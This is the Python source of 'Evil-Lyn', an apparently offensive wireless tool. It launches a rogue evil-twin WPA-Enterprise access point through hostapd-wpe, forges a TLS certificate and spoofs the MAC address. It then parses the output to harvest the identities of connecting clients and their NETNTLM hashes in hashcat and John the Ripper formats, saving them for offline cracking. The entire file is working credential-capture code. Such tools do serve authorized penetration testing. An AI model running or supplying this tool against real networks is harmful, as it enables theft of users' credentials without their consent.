#!/usr/bin/env python3

from utils import arguments
from utils import channels
from utils.colors import Colors as c
from utils import interface
from utils import mkdir
from utils import openssl
from utils import sqlite as db
from shutil import which
from datetime import datetime
from configparser import ConfigParser, ExtendedInterpolation
import asyncio
import os
import sys
import re
import logging
import time
try:
	from utils import dbmanager
	from utils import richard as r
	richlib = True
except Exception as e:
	print(f'\n[{c.RED}!{c.END}] Python Library "Rich" not found.')
	print(f'[{c.RED}!{c.END}] Database Manager has been Disabled.')
	print(f'[{c.RED}!{c.END}] Prettify mode has been Disabled.')
	print(f'[{c.BLUE}*{c.END}] To fix, try: "python3 -m pip install rich"')
	richlib = False

# Argparse - Init and parse.
args = arguments.parser.parse_args()

# Check Requirements - checks before creating files and dirs that might take time
if which("hostapd-wpe") is None:
	logging.error(f'hostapd-wpe - not installed!')
	logging.error(f'Install by running sudo apt install hostapd-wpe')
	sys.exit(1)

if which("openssl") is None:
	logging.error(f'openssl - not installed!')
	logging.error(f'Install by running sudo apt install openssl')
	sys.exit(1)

if which("macchanger") is None:
	logging.error(f'macchanger not installed!')
	logging.error(f'Install by running sudo apt install macchanger')
	sys.exit(1)

# Argparse - minimal.
minimal = False
if args.minimal or not richlib:
	minimal = True

# ConfigParser - init and defined instance options.
config_obj = ConfigParser(
	allow_no_value=True,
	delimiters='=',
	interpolation=ExtendedInterpolation(),
	)
# ConfigParser - enabled case sensitive.
config_obj.optionxform = str

# Application - directories and filepaths.
APPLICATION_FP = __file__
APPLICATION_DIR = os.path.dirname(__file__)

# Relative directories and filepaths.
CONFIGS_DIR = 'configs'
TEMPLATES_DIR = 'templates'
TEMPLATE_HOSTAPD_FP = os.path.join(TEMPLATES_DIR, 'hostapd-wpe.conf')
OPENSSL_CERTS_DIR = os.path.join(CONFIGS_DIR, 'openssl_certificates')
HOSTAPD_CONF_DIR = os.path.join(CONFIGS_DIR, 'hostapd_conf')
RESULTS_DIR = 'results'
# DEV
# EAPUSER_TEMPLATE = f''

# Absolute directories and filepaths.
configini_fp = os.path.join(CONFIGS_DIR, f'config.ini')
hostapd_log_fp = os.path.join(APPLICATION_DIR, RESULTS_DIR, '')
hostapd_servercert_fp = os.path.join(APPLICATION_DIR, OPENSSL_CERTS_DIR, 'cert.pem')
hostapd_privatekey_fp = os.path.join(APPLICATION_DIR, OPENSSL_CERTS_DIR, 'cert.key')

# Application - create required dirs.
directories = [CONFIGS_DIR, OPENSSL_CERTS_DIR, HOSTAPD_CONF_DIR, RESULTS_DIR, TEMPLATES_DIR]
dirs = [mkdir.mkdir(directory) for directory in directories]
if args.loglevel == 'info'.upper():
	[print(f'[*] Created directory: {d}') for d in dirs if d is not None]


def update_config_obj():
	''' Update ConfigParser's 'config_obj' object from cmdline argument values. '''

	# ConfigParser - default dict.
	config_obj['Main'] = {
		'hostapd_filepath':HOSTAPD_CONF_DIR + '/${Hostapd:essid}.conf'
		}
	# ConfigParser - interface dict.
	config_obj['Interface'] = {	
		'interface':f'{args.interface}',
		'bssid':f'{args.interface_mac}',
		'tx_power':f'{args.interface_txpower}',
		'regulatory_domain':f'{args.interface_reg}'
		}
	# ConfigParser - openssl dict.
	config_obj['OpenSSL'] = {
		'country':f'{args.openssl_country}',
		'state':f'{args.openssl_state}',
		'city':f'{args.openssl_city}',
		'company':f'{args.openssl_company}',
		'ou':f'{args.openssl_ou}',
		'email':f'{args.openssl_email}',
		'cert_pem_filepath':f'{hostapd_servercert_fp}',
		'cert_key_filepath':f'{hostapd_privatekey_fp}'
		}
	# ConfigParser - hostapd dict.
	config_obj['Hostapd'] = {
		'interface':f'{args.interface}',
		'channel':f'{args.hostapd_channel}',
		'band':f'{args.hostapd_band.lower()}',
		'essid':f'{args.hostapd_essid}',
		'country_code':f'{args.hostapd_cc}',
		'logfile':f'{hostapd_log_fp}' + '${Hostapd:essid}.log',
		'cert_pem_filepath':f'{hostapd_servercert_fp}',
		'cert_key_filepath':f'{hostapd_privatekey_fp}',
		# 'eap_user_file':f'{eapuser_template}' # DEV
		}
	return config_obj


def write_hostapd(config_obj, input_file, output_file):
	''' Read ConfigParser's object from memory and write 
		custom hostapd configuration to filesystem. '''
	
	# ConfigParser - read Hostpad dict
	hostapd_dic = {k: v for k, v in config_obj['Hostapd'].items()}

	with open(input_file, 'r') as infile, open(output_file, 'w') as outfile:
		lines = infile.readlines()
		lines[3] = f"interface={hostapd_dic['interface']}\n"
		# lines[6] = f"eap_user_file={hostapd_dic['eap_user_file']}\n"
		lines[8] = f"server_cert={hostapd_dic['cert_pem_filepath']}\n"
		lines[9] = f"private_key={hostapd_dic['cert_key_filepath']}\n"
		lines[14] = f"ssid={hostapd_dic['essid']}\n"
		lines[15] = f"channel={hostapd_dic['channel']}\n"
		lines[19] = f"wpe_logfile={hostapd_dic['logfile']}\n"
		lines[146] = f"country_code={hostapd_dic['country_code']}\n"
		lines[183] = f"hw_mode={hostapd_dic['band']}\n"
		outfile.writelines(lines)
	return outfile.name


async def write_results(file_ext, directory, dbquery):
	''' Write database results to a flatfile. '''

	essid = config_obj['Hostapd']['essid']
	filepath = os.path.join(directory, f'{essid}.{file_ext}')

	count = 0
	while True:
		count +=1
		# print(f'[DB Query] {count}')
		# On second iteration and above, compare new Identity-Set length to previous Identity-Set length.
		if count >= 2:
			db_set = dbquery()
			new_db_set_length = len(db_set)
			# Check for new entries in the db.
			if new_db_set_length > db_set_length:
				if not minimal:
					r.console.print(f' Results file updated: [repr.path]{filepath}')
				else:
					print(f'[*] Results file updated: {filepath}')
				# Write file with sorted and unique results. 
				with open(filepath, 'w+') as f2:
					for i in sorted(db_set):
						f2.write(f'{i}\n')
						# print(f'[*] {i}')
		# Read db results and create Set from results.
		db_set = dbquery()
		db_set_length = len(db_set)
		# print(f'[# of Entries] {db_set_length}')
		await asyncio.sleep(10)


def stream_parser_identity(line):
	''' Parse Identity from stream '''
	
	identity_lst = line.split(' ', 9)
	sta_macaddress = identity_lst[2]
	identity_str = identity_lst[9]
	# Remove ' from first and last char.
	identity = identity_str[1:-1]
	return identity, sta_macaddress


def stream_parser_jtr(line):
	''' Parse JTR Hash from Stream '''

	netntlm_lst  = line.split(' ', 2)
	netntlm_str = netntlm_lst[2]
	# Remove "tab" from lst, convert Hash portion to str.
	jtr_lst = netntlm_str.split('\t')
	jtr = jtr_lst[2]
	# Parse Username from Hash.
	username_lst = jtr.split(f':'*1)
	username = username_lst[0]
	return username, jtr


def stream_parser_hashcat(line):
	''' Parse Hashcat from Stream '''
	
	netntlm_lst  = line.split(' ', 2)
	netntlm_str = netntlm_lst[2]
	# Remove "tab" from lst, convert Hash portion to str.
	hashcat_lst = netntlm_str.split('\t')
	hashcat = hashcat_lst[1]
	# Parse Username from Hash.
	username_lst = hashcat.split(f':'*4)
	username = username_lst[0]
	return username, hashcat


async def stream_reader(pid, stream, returncode):
	'''  Read stream, parse and populate database.	'''

	print(f'[*] Hostapd PID: {pid}')

	while True:
		line = await stream.readline()
		line_decoded = line.decode('UTF-8').rstrip()

		if line_decoded:
			ts = '{:%m-%d %H:%M:%S}'.format(datetime.now())
			# Filter Off.
			if args.nofilter:
				print(f'{line_decoded}')
			# Filter On - Hostapd config.
			if not args.nofilter:
				# Standard print.
				if 'Configuration file:' in line_decoded:
					line_decoded_lst = line_decoded.split(' ', 2)
					print(f'[*] Hostapd Config: {line_decoded_lst[2]}')
				elif 'Using interface' in line_decoded:
					line_decoded_lst = line_decoded.split(' ', 8)
					print(f'[*] Hostapd Interface: {line_decoded_lst[2]}')
					print(f'[*] Hostapd BSSID: {line_decoded_lst[5]}')
					print(f'[*] Hostapd ESSID: {line_decoded_lst[8]}\n')
				elif 'AP-ENABLED' in line_decoded:
					print(f'{c.GREEN}[*]{c.END} {line_decoded}')
				elif 'AP-DISABLED' in line_decoded:
					print(f'{c.RED}[*]{c.END} {line_decoded}')
				elif 'INTERFACE-DISABLED' in line_decoded:
					print(f'{c.RED}[*]{c.END} {line_decoded}')
				elif 'INTERFACE-ENABLED' in line_decoded:
					print(f'{c.GREEN}[*]{c.END} {line_decoded}')
			# Filter On - Identity.
			if 'Identity received from STA:' in line_decoded:
				# PrettyPrint.
				if not args.nofilter and not minimal:
					r.console.print(f' {ts} [id][IDENTITY][/id] {line_decoded}')
				# Standard print.
				elif not args.nofilter and minimal:
					print(f'{ts} [IDENTITY] {line_decoded}')
				# Read from parsed 'stream' and populate database.
				identity, sta_macaddress = stream_parser_identity(line_decoded)
				db.insert_identity(identity, sta_macaddress)
			# Filter On - jtr.
			if 'jtr NETNTLM:' in line_decoded:
				results = stream_parser_jtr(line_decoded)
				username = results[0]
				jtr = results[1]
				# PrettyPrint.
				# if not args.nofilter and not minimal:
				# 	r.console.print(f' [ts]{ts}[/ts] [or][NETNTLM][/or] [gold3]{jtr}')
				# # Standard print.
				# if not args.nofilter and minimal:
				# 	print(f'{ts} [JTR] {jtr}')
			# Filter On - hashcat.
			if 'hashcat NETNTLM:' in line_decoded:
				# Read from parsed 'stream' and populate database.
				results = stream_parser_hashcat(line_decoded)
				username = results[0]
				hashcat = results[1]
				# PrettyPrint.
				if not args.nofilter and not minimal:
					r.console.print(f' [ts]{ts}[/ts] [or][NETNTLM][/or] [gold3]{hashcat}')
				# Standard print.
				elif not args.nofilter and minimal:
					print(f'{ts} [NETNTLM] {hashcat}')
				db.insert_netntlm(username, hashcat, jtr)
		elif returncode is not None:
			print(f'{returncode}')
			break
		# await asyncio.sleep(.5)

	
async def hostapd_subprocess(cmd, conf, runtime):
	''' Asyncio Concurrent Tasks '''

	cmdlst = cmd.split(' ')
	cmdlst.append(conf)
	proc = await asyncio.create_subprocess_exec(
		# Permit lst with '*'.
		* cmdlst, 
		stdout=asyncio.subprocess.PIPE, 
		stderr=asyncio.subprocess.PIPE
		)
	# Asyncio - create and name tasks.
	task_stdout = asyncio.create_task(stream_reader(proc.pid, proc.stdout, proc.returncode), name='STREAM STDOUT')
	task_stderr = asyncio.create_task(stream_reader(proc.pid, proc.stderr, proc.returncode), name='STREAM STDERR')
	task_write_results_id = asyncio.create_task(write_results('id', RESULTS_DIR, db.get_identity), name='WRITE RESULTS - IDENTITY')
	task_write_results_hc = asyncio.create_task(write_results('hc', RESULTS_DIR, db.get_hashcat_hash), name='WRITE RESULTS - HASHCAT')

	# Asyncio - concurrently run stdout/stderr streams. Used asyncio.wait() for 'timeout'.
	try:
		done, pending = await asyncio.wait([task_stdout, task_stderr, task_write_results_id, task_write_results_hc],
			# return_when=asyncio.FIRST_EXCEPTION
			timeout=args.runtime
			)
		# Terminate proc, executes after 'asyncio.wait.timeout' timeout.
		proc.terminate()
		print(f'\n[*] Runtime Expired: {args.runtime} seconds') 
		print(f'[*] Terminated PID: {proc.pid}')
		# Asyncio - cancel pending Tasks.
		for task in pending:
			if task.cancel():
				print(f'[*] Task Canceled: "{task.get_name()}"')
			# Required to cancel tasks successfullly, else. runtime error will occur.
			time.sleep(.25)
		# Asyncio - print completed Tasks.
		for task in done:
			print(f'[*] Task Completed/Done: "{task.get_name()}"')
			print(f'[*] Task Result: "{task.result()}"')
			# Required to cancel tasks successfullly, else. runtime error will occur.
			time.sleep(.25)
	except Exception as e:
		print(f'Exception: {e}')
	return None


def main():
	''' '''

	# Main onload line break.
	print(f'\n')

	# Args - droptables
	if args.droptables and richlib:
		dbmanager.menu_option_droptables()

	# Database-manager Menu.
	if richlib and not minimal:
		dbmanager.menu()

	# Sqlite - database init.
	try:
		db.create_table_identity()
		db.create_table_netntlm()
	except Exception as e:
		logging.error(f'{e}')
		sys.exit(1)

	# Evil-lyn - update ConfigParser object 
	# Note, this is an in memory object a 'config.ini' is NOT written to disk.
	try:
		config_obj = update_config_obj()
	except Exception as e:
		logging.error(f'{e}')
		sys.exit(1)
	else:
		# Main
		hostapd_conf_fp = config_obj['Main']['hostapd_filepath']
		# Inteface
		ifname_01 = config_obj['Interface']['interface']
		bssid = config_obj['Interface']['bssid']
		regulatory_domain = config_obj['Interface']['regulatory_domain']
		tx_power = config_obj['Interface']['tx_power']
		# OpenSSL
		openssl_country = config_obj['OpenSSL']['country']
		openssl_state = config_obj['OpenSSL']['state']
		openssl_city = config_obj['OpenSSL']['city']
		openssl_company = config_obj['OpenSSL']['company']
		openssl_ou = config_obj['OpenSSL']['ou']
		openssl_email = config_obj['OpenSSL']['email']
		openssl_certpem_fp = config_obj['OpenSSL']['cert_pem_filepath']
		openssl_certkey_fp = config_obj['OpenSSL']['cert_key_filepath']

	# Interface - init and set ifname from ConfigParse obj.
	interface_01 = interface.Interface(ifname_01)

	# Syntax panel onload line break.
	if not minimal:
		print('\n')
	
	# Evil-lyn - write hostapd.conf file.
	try:
		results = write_hostapd(config_obj, TEMPLATE_HOSTAPD_FP, hostapd_conf_fp)
	except Exception as e:
		logging.error(f'{e}')
		sys.exit(1)
	else:
		# Print to STDOUT.
		if not minimal:
			r.console.print(r.Panel(r.Syntax(
			f"""\
			\n Created Hostapd Configuration file: {results}
			""",
			"notalanguage",
			word_wrap=False), 
			title="Evil-Lyn",
			title_align="left"))
		else:
			print('-'*100)
			print(f'[*] Created Hostapd Configuration file: {results}\n')
	
	# OpenSSL - write certficate files.
	try:
		create_certificate = openssl.OpenSSL(openssl_country, openssl_state, openssl_city, openssl_company, 
			openssl_ou, openssl_email, openssl_certpem_fp, openssl_certkey_fp)
		openssl_results = create_certificate.run()
	except Exception as e:
		logging.error(f'{e}')
		sys.exit(1)
	else:
		openssl_cmd = ' '.join(openssl_results[0])
		openssl_stderr = openssl_results[2]
		# OpenSSL - clean stderr output.
		openssl_dotted = openssl_stderr.split('+')[0].replace('\n', '\n\t')
		openssl_text = openssl_stderr.split('+')[10].replace('\n', '\n\t')
		
		# Print to STDOUT.
		if not minimal:
			r.console.print(r.Panel(r.Syntax(
			f"""\
			\n OpenSSL Command:\
			\n\t{openssl_cmd}\
			\n OpenSSL Output:\
			\n\t{openssl_dotted}{openssl_text}""",
			"notalanguage",
			word_wrap=False),
			title="OpenSSL", 
			title_align="left"))
		else:
			print('-'*100)
			print(f'[*] OpenSSL Command: {openssl_cmd}')
			print(f'[*] OpenSSL Output:\n{openssl_dotted}{openssl_text}')

	# Interface - set MAC address.
	try:
		interface_01.set_active(activate=False)
		if not bssid:
			# print(f'[*] Set interface MAC argument "-m" not found')
			set_mac_results = interface_01.set_mac(f'-s')
		else:
			set_mac_results = interface_01.set_mac(f'--mac={bssid}')
		interface_01.set_active(activate=True)
	except Exception as e:
		logging.error(f'{e}')
		sys.exit(1)
	else:
		set_mac_cmd = ' '.join(set_mac_results[0])
		set_mac_stdout = set_mac_results[1].replace('\n', '\n\t')
		set_mac_stderr = set_mac_results[2].replace('\n', '\n\t')

		# Print to STDOUT.
		if not minimal:
			r.console.print(r.Panel(r.Syntax(
			f"""\
			\n Macchanger Command: {set_mac_cmd}\
			\n Macchanger Output:\
			\n\t{set_mac_stdout}\
			{set_mac_stderr}""",
			"notalanguage",
			word_wrap=True), 
			title="Macchanger", 
			title_align="left"))
		else:
			print('-'*100)
			print(f'[*] Macchanger Command: {set_mac_cmd}')
			print(f'[*] Macchanger Output:\n{set_mac_stdout}')
			print(f'{set_mac_stderr}')

	# Interface - set Regulatory Domain.
	try:
		interface_01.set_active(activate=False)
		set_reg_results = interface_01.set_reg(f'{regulatory_domain}')
		interface_01.set_active(activate=True)
	except Exception as e:
		logging.error(f'{e}')
		sys.exit(1)
	else:
		set_reg_cmd = ' '.join(set_reg_results[0])
		set_reg_stdout = set_reg_results[1]
		# Print to STDOUT.
		if not minimal:
			r.console.print(r.Panel(r.Syntax(
			f"""\
			\n Regulatory Domain Command: {set_reg_cmd}\
			\n Regulatory Domain Output:\
			\n{set_reg_stdout}""",
			"notalanguage"),
			title="Regulatory Domain", 
			title_align="left"))
		else:
			print('-'*100)
			print(f'[*] Regulatory Domain Command: {set_reg_cmd}')
			print(f'[*] Regulatory Domain Output:\n{set_reg_stdout}')

	# Interface - set TX Power.
	try:
		interface_01.set_active(activate=False)
		set_txpower_results = interface_01.set_txpower(f'{tx_power}')
		interface_01.set_active(activate=True)
	except Exception as e:
		logging.error(f'{e}')
		sys.exit(1)
	else:
		set_txpower_cmd = ' '.join(set_txpower_results[0])
		set_txpower_stdout = set_txpower_results[1]
		# Print to STDOUT.
		if not minimal:
			r.console.print(r.Panel(r.Syntax(f"""\
			\n TX Power Command: {set_txpower_cmd}\
			\n TX Power Output:\
			\n{set_txpower_stdout}""",
			"notalanguage"),
			title="TX Power",
			title_align="left"))
		else:
			print('-'*100)
			print(f'[*] TX Power Command: {set_txpower_cmd}')
			print(f'[*] TX Power Output:\n{set_txpower_stdout}')

	# Hostapd - Create instance and launch.
	try:
		# Print to STDOUT.
		if not minimal:
			r.console.print(r.Panel(r.Syntax(
			f"""\
			\n ESSID: {config_obj['Hostapd']['essid']}\
			\n BSSID: {config_obj['Interface']['bssid']}\
			\n Channel: {config_obj['Hostapd']['channel']}\
			\n Certificate Name: {config_obj['OpenSSL']['company']}\
			\n Band: {config_obj['Hostapd']['band']}\
			\n Interface: {config_obj['Hostapd']['interface']}\
			\n Runtime: {args.runtime}
			""",
			"notalanguage"),
			title="EvilTwin Details", 
			title_align="left"))
		# Print to STDOUT.
		else:
			print('-'*100)
			print(f'[*] ESSID: {config_obj["Hostapd"]["essid"]}')
			print(f'[*] BSSID: {config_obj["Interface"]["bssid"]}')
			print(f'[*] Channel: {config_obj["Hostapd"]["channel"]}')
			print(f'[*] Certificate Name: {config_obj["OpenSSL"]["company"]}')
			print(f'[*] Band: {config_obj["Hostapd"]["band"]}')
			print(f'[*] Interface: {config_obj["Hostapd"]["interface"]}')
			print(f'[*] Runtime: {args.runtime}')
			print('-'*100)

		# Hostapd - launch with spinner.
		if not minimal:
			with r.console.status(spinner='dots', status=f'Hostapd running...', spinner_style='or') as status:
				# Timer - start
				start = time.perf_counter()
				asyncio.run(hostapd_subprocess('hostapd-wpe', hostapd_conf_fp, args.runtime))
				# Timer - finish
				end = time.perf_counter()
				print(f'[*] Completed in: {round(end-start,0)} second(s).\n')
		
		# Hostapd - launch without spinner.
		else:
			# Timer - start
			start = time.perf_counter()
			asyncio.run(hostapd_subprocess('hostapd-wpe', hostapd_conf_fp, args.runtime))
			# Timer - finish
			end = time.perf_counter()
			print(f'[*] Completed in: {round(end-start,0)} second(s).\n')
	except KeyboardInterrupt:
		print(f'\nQuit: detected [CTRL-C] ')
		sys.exit(0)


if __name__ == '__main__':
	main()

